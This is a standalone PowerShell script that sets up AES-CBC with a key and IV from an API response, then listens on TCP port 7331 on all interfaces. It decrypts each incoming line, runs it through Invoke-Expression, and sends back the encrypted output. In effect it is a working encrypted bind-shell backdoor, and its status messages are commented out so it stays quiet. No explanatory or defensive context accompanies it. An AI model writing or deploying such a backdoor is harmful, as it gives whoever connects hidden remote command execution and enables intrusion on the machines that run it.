# AES CBC encryption and decryption
function Create-AesManaged {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    return $aes
}

function Set-KeyAndIv {
    param (
        [System.Security.Cryptography.AesManaged]$aes,
        [string[]]$base64Key,
        [string[]]$base64IV
    )
    $aes.Key = [System.Convert]::FromBase64String($base64Key)
    $aes.IV = [System.Convert]::FromBase64String($base64IV)
}

function Encrypt-AESCBC {
    param (
        [byte[]]$plaintext,
        [System.Security.Cryptography.AesManaged]$aes
    )

    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($plaintext, 0, $plaintext.Length)
    $encryptor.Dispose()

    return $encrypted
}

function Decrypt-AESCBC {
    param (
        [byte[]]$encrypted,
        [System.Security.Cryptography.AesManaged]$aes
    )

    $decryptor = $aes.CreateDecryptor()
    $decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
    $decryptor.Dispose()

    return $decrypted
}

$aes = Create-AesManaged
$base64Key = $apiResponse.key
$base64IV = $apiResponse.iv
Set-KeyAndIv -aes $aes -base64Key $base64Key -base64IV $base64IV

$listenerPortNumber = 7331
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $listenerPortNumber)
$listener.Start()
# Write-Output "TCP listener started on port $listenerPortNumber"

try {
    while ($true) {
        $listenerThread = $listener.AcceptTcpClientAsync()

        while ($listenerThread.IsCompleted -eq $false) {
            # sleep 0.1s while waiting for a connection, so we don't exhaust the machine's resources
            Start-Sleep -Milliseconds 100
        }

        $client = $listenerThread.Result
        $stream = $client.GetStream()
        $reader = [System.IO.StreamReader]::new($stream)
        $writer = [System.IO.StreamWriter]::new($stream)
        $writer.AutoFlush = $true

        while ($true) {
            # Read the data sent by the client
            $data = $reader.ReadLine()

            if (($data -eq $null) -or ($data -eq "quit")) {
                $response = "Connection closed by the client!"
                # Write-Output $response
                $reader.Close()
                $writer.Close()
                $stream.Close()
                $client.Close()
                break
            }
            # Write-Output "Received data from client: $data"

            # Send a response back to the client
            try {
                # decrypt the AES CBC message first
                $encryptedDataBytes = [System.Convert]::FromBase64String($data)
                $decryptedBytes = Decrypt-AESCBC -encrypted $encryptedDataBytes -aes $aes
                $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

                if ($decryptedString -eq "ping") {
                    # Write-Output "Received a ping request from client"
                    $response = "pong"
                    # Write-Output "Respond back pong request to client"
                } else {
                    # execute the decrypted string and output the object as a string
                    $response = Invoke-Expression "$decryptedString" | Out-String
                    # Write-Output "Response to server: $response"
                }

                # encrypt the response and send it back
                $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($response)
                $encryptedBytes = Encrypt-AESCBC -plaintext $responseBytes -aes $aes
                $base64EncryptedResponse = [Convert]::ToBase64String($encryptedBytes)
            } catch [System.Management.Automation.CommandNotFoundException]{
                # Write-Warning "This command is not found: $data`nError: $Error[0]"
            } catch {
                # Write-Warning "An unknown error occurred. Error: $Error[0]"
            }
            $writer.WriteLine($base64EncryptedResponse)
        }
    }
}
finally {
    $listener.Stop()
}